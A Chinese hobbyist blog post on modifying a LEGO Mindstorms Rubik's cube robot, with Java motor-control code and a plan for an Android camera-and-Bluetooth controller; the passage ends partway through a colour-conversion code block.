<p>先是抱Hans Andersson大神的大腿，开始拼<a href="http://tiltedtwister.com/download/tt2/TT2.pdf">Tilted Twister</a>，拼成之后发现完全无法顺利行╮(╯▽╰)╭。主要原因是颜色识别很不准，主要是魔方的<strong>橙色</strong>块和<strong>红色</strong>块，通过颜色传感器采集到的颜色值太相近了(采集到的颜色值是8bit，范围是0~255)，根本无法有效区分开，外界光线的亮一点或者暗一点都会严重影响识别正确率。并且因为乐高自身的CPU和内存都弱到爆炸，大约需要30s~60s才能计算出一个平均50步的解法，再花约3-5分钟进行还原，速度还没有我自己快。</p>

<p><img src="http://xelz.info/assets/2017/tiltedtwister2.jpg" alt="lego-8547" /></p>

<p>后来冒出了个想法：何不使用手机摄像头扫描，然后在手机上计算还原步骤再控制机器人还原？这样不仅可以一次性扫描9个色块，也可以利用手机强大的CPU在更短的时间内计算出步骤更少的解法，同时提高准确率与运行效率。</p>

<h2>0x02 动手改造</h2>

<p>先把颜色传感器拆掉，原来的LEGO的执行程序就不能用了，需要自己来写，只需实现机械控制部分。</p>

<p>机器人有两个Motor，以LEGO的前脸为正面视角：</p>

<p><img src="http://xelz.info/assets/2017/lego-axis.png" alt="axis" /></p>

<ul>
<li>机械臂往前<code>推(PUSH)</code>，可以让魔方绕X轴逆时针旋转90°，实现上、前、下、后四个面之间的翻转</li>
<li>底座<code>旋转(ROTATE)</code>，可以让魔方绕Y轴旋转，实现前，右，后，左四个面之间的翻转</li>
<li>机械臂和底座配合，可以将魔方翻转到任意面</li>
<li>机械臂<code>抓住(HOLD)</code>魔方的上面两层，然后底座旋转，可以实现<code>拧(TWIST)</code>魔方的底面</li>
<li>公式的每一步操作都可以拆解为：将该步骤所要拧的面翻转到底面，然后抓住魔方，用底座拧魔方的底面</li>
</ul>


<p>(PS: 魔方公式形如<code>U2 F D' R2 D F2 B2 L2</code>,每个字母代表顺时针将一个面旋转90°：Up, Bottom, Front, Back, Left, Right. 字母后面跟<code>2</code>表示拧两次，也就是180°，跟<code>'</code>表示逆时针90°。)</p>

<p>因此，需要两个循环队列来保存魔方在X轴和Y轴方向上的状态：pushChain的第一个元素是朝下的面，第二个元素就是通过一次PUSH操作，会翻转到朝下的面，也就是朝前的面，以此类推。每次旋转或者翻转操作，都需要同步更新两个队列的状态</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">private</span> <span class="kd">static</span> <span class="n">LinkedList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span>   <span class="n">pushChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">LinkedList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;(),</span>
</span><span class='line'>                                  <span class="n">rotateChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">LinkedList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;();</span>
</span><span class='line'>
</span><span class='line'><span class="kd">static</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">pushChain</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">D</span><span class="o">);</span>
</span><span class='line'>    <span class="n">pushChain</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">F</span><span class="o">);</span>
</span><span class='line'>    <span class="n">pushChain</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">U</span><span class="o">);</span>
</span><span class='line'>    <span class="n">pushChain</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">B</span><span class="o">);</span>
</span><span class='line'>    <span class="n">rotateChain</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">F</span><span class="o">);</span>
</span><span class='line'>    <span class="n">rotateChain</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">L</span><span class="o">);</span>
</span><span class='line'>    <span class="n">rotateChain</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">B</span><span class="o">);</span>
</span><span class='line'>    <span class="n">rotateChain</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">R</span><span class="o">);</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/**</span>
</span><span class='line'><span class="cm"> * push the cube using the long arm.</span>
</span><span class='line'><span class="cm"> * Face FRONT turns to DOWN</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'><span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">push</span><span class="o">()</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">arm</span><span class="o">.</span><span class="na">rotate</span><span class="o">(</span><span class="n">PUSH_ANGLE</span><span class="o">);</span>
</span><span class='line'>    <span class="n">sleep</span><span class="o">(</span><span class="mi">50</span><span class="o">);</span>
</span><span class='line'>    <span class="n">arm</span><span class="o">.</span><span class="na">rotate</span><span class="o">(-</span><span class="n">PUSH_ANGLE</span><span class="o">);</span>
</span><span class='line'>    <span class="c1">// update pushChain and rotateChain</span>
</span><span class='line'>    <span class="n">pushChain</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">pushChain</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="mi">0</span><span class="o">));</span>
</span><span class='line'>    <span class="n">rotateChain</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">pushChain</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="mi">1</span><span class="o">));</span>
</span><span class='line'>    <span class="n">rotateChain</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="n">pushChain</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="mi">3</span><span class="o">));</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/**</span>
</span><span class='line'><span class="cm"> * rotate the base (DOWN FACE) with a specified angle</span>
</span><span class='line'><span class="cm"> * @param angle the degrees to rotate</span>
</span><span class='line'><span class="cm"> * @param changeFacelet whether to update the facelet chain</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'><span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">rotate</span><span class="o">(</span><span class="kt">int</span> <span class="n">angle</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">changeFacelet</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">currentPosition</span> <span class="o">=</span> <span class="n">base</span><span class="o">.</span><span class="na">getTachoCount</span><span class="o">();</span>
</span><span class='line'>    <span class="k">switch</span> <span class="o">(</span><span class="n">angle</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="k">case</span> <span class="mi">90</span><span class="o">:</span>
</span><span class='line'>            <span class="k">if</span> <span class="o">(</span><span class="n">currentPosition</span> <span class="o">&gt;</span> <span class="mi">225</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                <span class="n">base</span><span class="o">.</span><span class="na">rotateTo</span><span class="o">(</span><span class="n">currentPosition</span> <span class="o">-</span> <span class="mi">270</span><span class="o">);</span>
</span><span class='line'>            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span><span class='line'>                <span class="n">base</span><span class="o">.</span><span class="na">rotateTo</span><span class="o">(</span><span class="n">currentPosition</span> <span class="o">+</span> <span class="mi">90</span><span class="o">);</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>            <span class="k">if</span> <span class="o">(</span><span class="n">changeFacelet</span><span class="o">)</span>
</span><span class='line'>                <span class="n">rotateChain</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">rotateChain</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="mi">0</span><span class="o">));</span>
</span><span class='line'>            <span class="k">break</span><span class="o">;</span>
</span><span class='line'>        <span class="k">case</span> <span class="mi">180</span><span class="o">:</span>
</span><span class='line'>            <span class="k">if</span> <span class="o">(</span><span class="n">currentPosition</span> <span class="o">&gt;</span> <span class="mi">135</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                <span class="n">base</span><span class="o">.</span><span class="na">rotateTo</span><span class="o">(</span><span class="n">currentPosition</span> <span class="o">-</span> <span class="mi">180</span><span class="o">);</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>            <span class="k">else</span> <span class="o">{</span>
</span><span class='line'>                <span class="n">base</span><span class="o">.</span><span class="na">rotateTo</span><span class="o">(</span><span class="n">currentPosition</span> <span class="o">+</span> <span class="mi">180</span><span class="o">);</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>            <span class="k">if</span> <span class="o">(</span><span class="n">changeFacelet</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                <span class="n">rotateChain</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">rotateChain</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="mi">0</span><span class="o">));</span>
</span><span class='line'>                <span class="n">rotateChain</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">rotateChain</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="mi">0</span><span class="o">));</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>            <span class="k">break</span><span class="o">;</span>
</span><span class='line'>        <span class="k">case</span> <span class="o">-</span><span class="mi">90</span><span class="o">:</span>
</span><span class='line'>            <span class="k">if</span> <span class="o">(</span><span class="n">currentPosition</span> <span class="o">&lt;</span> <span class="mi">45</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                <span class="n">base</span><span class="o">.</span><span class="na">rotateTo</span><span class="o">(</span><span class="n">currentPosition</span> <span class="o">+</span> <span class="mi">270</span><span class="o">);</span>
</span><span class='line'>            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span><span class='line'>                <span class="n">base</span><span class="o">.</span><span class="na">rotateTo</span><span class="o">(</span><span class="n">currentPosition</span> <span class="o">-</span> <span class="mi">90</span><span class="o">);</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>            <span class="k">if</span> <span class="o">(</span><span class="n">changeFacelet</span><span class="o">)</span>
</span><span class='line'>                <span class="n">rotateChain</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">rotateChain</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="mi">3</span><span class="o">));</span>
</span><span class='line'>            <span class="k">break</span><span class="o">;</span>
</span><span class='line'>        <span class="k">default</span><span class="o">:</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span><span class="n">changeFacelet</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">pushChain</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">rotateChain</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="mi">0</span><span class="o">));</span>
</span><span class='line'>        <span class="n">pushChain</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="mi">3</span><span class="o">,</span> <span class="n">rotateChain</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="mi">2</span><span class="o">));</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>之后就可以将任意面，通过不超过两步的操作翻转到底面，例如，可以通过两次<code>PUSH</code>将顶面翻转到底面，也可以通过底座顺时针旋转90°后，再<code>PUSH</code>将左侧的面翻转到底面：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="cm">/**</span>
</span><span class='line'><span class="cm"> * make the specified facelet downwards to bottom</span>
</span><span class='line'><span class="cm"> * @param facelet target face</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">changetoFacelet</span><span class="o">(</span><span class="n">String</span> <span class="n">facelet</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="k">switch</span> <span class="o">(</span><span class="n">pushChain</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">facelet</span><span class="o">))</span> <span class="o">{</span>
</span><span class='line'>        <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
</span><span class='line'>            <span class="k">return</span><span class="o">;</span>
</span><span class='line'>        <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
</span><span class='line'>            <span class="n">push</span><span class="o">();</span>
</span><span class='line'>            <span class="k">return</span><span class="o">;</span>
</span><span class='line'>        <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
</span><span class='line'>            <span class="n">push</span><span class="o">();</span>
</span><span class='line'>            <span class="n">push</span><span class="o">();</span>
</span><span class='line'>            <span class="k">return</span><span class="o">;</span>
</span><span class='line'>        <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
</span><span class='line'>            <span class="n">rotate</span><span class="o">(</span><span class="mi">180</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
</span><span class='line'>            <span class="n">push</span><span class="o">();</span>
</span><span class='line'>            <span class="k">return</span><span class="o">;</span>
</span><span class='line'>        <span class="k">default</span><span class="o">:</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="k">switch</span> <span class="o">(</span><span class="n">rotateChain</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">facelet</span><span class="o">))</span> <span class="o">{</span>
</span><span class='line'>        <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
</span><span class='line'>            <span class="n">rotate</span><span class="o">(</span><span class="mi">90</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
</span><span class='line'>            <span class="n">push</span><span class="o">();</span>
</span><span class='line'>            <span class="k">return</span><span class="o">;</span>
</span><span class='line'>        <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
</span><span class='line'>            <span class="n">rotate</span><span class="o">(-</span><span class="mi">90</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
</span><span class='line'>            <span class="n">push</span><span class="o">();</span>
</span><span class='line'>            <span class="k">return</span><span class="o">;</span>
</span><span class='line'>        <span class="k">default</span><span class="o">:</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>拧(TWIST)</code>的动作可以通过<code>HOLD-&gt;ROTATE-&gt;RELEASE</code>的步骤实现</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="cm">/**</span>
</span><span class='line'><span class="cm"> * twist DOWN FACE 90 degrees</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'><span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">turnClockwise</span><span class="o">()</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">hold</span><span class="o">();</span>
</span><span class='line'>    <span class="n">rotate</span><span class="o">(</span><span class="mi">90</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
</span><span class='line'>    <span class="n">release</span><span class="o">();</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/**</span>
</span><span class='line'><span class="cm"> * twist DOWN FACE -90 degrees</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'><span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">turnAntiClockwise</span><span class="o">()</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">hold</span><span class="o">();</span>
</span><span class='line'>    <span class="n">rotate</span><span class="o">(-</span><span class="mi">90</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
</span><span class='line'>    <span class="n">release</span><span class="o">();</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/**</span>
</span><span class='line'><span class="cm"> * twist DOWN FACE 180 degrees</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'><span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">turnSemiCycle</span><span class="o">()</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">hold</span><span class="o">();</span>
</span><span class='line'>    <span class="n">rotate</span><span class="o">(</span><span class="mi">180</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
</span><span class='line'>    <span class="n">release</span><span class="o">();</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>至此，输入公式，机器人就可以一步步操作了</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'> <span class="cm">/**</span>
</span><span class='line'><span class="cm"> * Execute a specified expression</span>
</span><span class='line'><span class="cm"> * @param exp the expression to be executed</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'><span class="kd">static</span> <span class="kt">void</span> <span class="nf">execute</span><span class="o">(</span><span class="n">String</span> <span class="n">exp</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">exp</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">changetoFacelet</span><span class="o">(</span><span class="n">exp</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">i</span><span class="o">,</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="o">));</span>
</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">i</span> <span class="o">==</span> <span class="n">exp</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">||</span> <span class="n">exp</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="o">)</span> <span class="o">==</span> <span class="sc">&#39; &#39;</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">turnClockwise</span><span class="o">();</span>
</span><span class='line'>            <span class="n">i</span><span class="o">++;</span>
</span><span class='line'>        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">exp</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="o">)</span> <span class="o">==</span> <span class="sc">&#39;\&#39;&#39;</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">turnAntiClockwise</span><span class="o">();</span>
</span><span class='line'>            <span class="n">i</span> <span class="o">+=</span> <span class="mi">2</span><span class="o">;</span>
</span><span class='line'>        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">exp</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="o">)</span> <span class="o">==</span> <span class="sc">&#39;2&#39;</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">turnSemiCycle</span><span class="o">();</span>
</span><span class='line'>            <span class="n">i</span> <span class="o">+=</span> <span class="mi">2</span><span class="o">;</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>下面的视频是当时留下的一个DEMO，事先向LEGO输入了20步的还原公式，LEGO只管按照公式拧：</p>

<iframe height=490 width='100%' src='http://player.youku.com/embed/XMzc0MTgzNDEy' frameborder=0 'allowfullscreen'></iframe>


<h2>0x03 加入Android控制器</h2>

<p>LEGO支持蓝牙通信，因此可以用手机做主控端，整个系统的构思如下：</p>

<ul>
<li>手机与LEGO通过蓝牙连接</li>
<li>LEGO检测到魔方放入之后通知手机开始扫描</li>
<li>手机扫描完一个面之后，通知LEGO将魔方翻转到下一个面</li>
<li>扫描完毕后，手机开始计算还原步骤</li>
<li>手机通过蓝牙将还原公式发送给LEGO</li>
<li>LEGO按照公式将魔方还原</li>
</ul>


<p>手里有个Android手机(KTouch-650)，还有一部iPod Touch 4，虽然Android机性能有点差，但我那时候完全不懂Android和iOS开发。好在Java技能是游刃有余的，Android开发可以快速上手，也就不得不选择Android了。蓝牙连接和还原算法都好办，虽然LeJOS官方没有提供Android与LEGO通信的SDK，但是完全可以仿照PC的SDK实现一套，将蓝牙相关的实现替换为android.bluetooth包提供的实现即可。网上已经有大神给出了<a href="https://github.com/jpralves/tourrobot/blob/master/NXTController/src/lejos/pc/comm/NXTCommAndroid.java">源码</a>。还原算法可以直接采用Java实现的Two-Phase算法<a href="http://kociemba.org/cube.htm">twophase.jar</a>。</p>

<p>那么问题来了，怎么检测魔方在摄像头采集的画面中的位置，或者说怎么确定采集哪些像素点的颜色？最笨的办法就是——固定位置，为此，在取景界面上绘制了一个9宫格作为参考线，方便手动对齐：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="nd">@Override</span>
</span><span class='line'><span class="kd">public</span> <span class="kt">void</span> <span class="nf">onDraw</span><span class="o">(</span><span class="n">Canvas</span> <span class="n">canvas</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">width</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getWidth</span><span class="o">();</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">height</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getHeight</span><span class="o">();</span>
</span><span class='line'>  <span class="n">Paint</span> <span class="n">paint</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Paint</span><span class="o">();</span>
</span><span class='line'>  <span class="n">paint</span><span class="o">.</span><span class="na">setColor</span><span class="o">(</span><span class="n">Color</span><span class="o">.</span><span class="na">WHITE</span><span class="o">);</span>
</span><span class='line'>  <span class="n">paint</span><span class="o">.</span><span class="na">setStyle</span><span class="o">(</span><span class="n">Style</span><span class="o">.</span><span class="na">STROKE</span><span class="o">);</span>
</span><span class='line'>  <span class="n">canvas</span><span class="o">.</span><span class="na">drawRect</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span><span class="mi">0</span><span class="o">,</span><span class="n">width</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span><span class="n">height</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span><span class="n">paint</span><span class="o">);</span>
</span><span class='line'>  <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span><span class='line'>      <span class="n">canvas</span><span class="o">.</span><span class="na">drawLine</span><span class="o">(</span><span class="n">width</span><span class="o">/</span><span class="mi">3</span><span class="o">*</span><span class="n">i</span><span class="o">,</span><span class="mi">0</span><span class="o">,</span><span class="n">width</span><span class="o">/</span><span class="mi">3</span><span class="o">*</span><span class="n">i</span><span class="o">,</span><span class="n">height</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span><span class="n">paint</span><span class="o">);</span>
</span><span class='line'>      <span class="n">canvas</span><span class="o">.</span><span class="na">drawLine</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">height</span><span class="o">/</span><span class="mi">3</span><span class="o">*</span><span class="n">i</span><span class="o">,</span> <span class="n">width</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">height</span><span class="o">/</span><span class="mi">3</span><span class="o">*</span><span class="n">i</span><span class="o">,</span> <span class="n">paint</span><span class="o">);</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>大概长成这个样子：</p>

<p><img src="http://xelz.info/assets/2017/grid.png" alt="grid" /></p>

<p>手动将魔方与九宫格参考线对齐之后，点击屏幕任意位置开始取色。取色的时候需要取中心区域的多个点，然后计算平均色值，避免单个点的色值误差太大。这里遇到一个问题是Android摄像头的预览图像数据是YUV色彩空间，而不是RGB，需要先进行一次转换:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
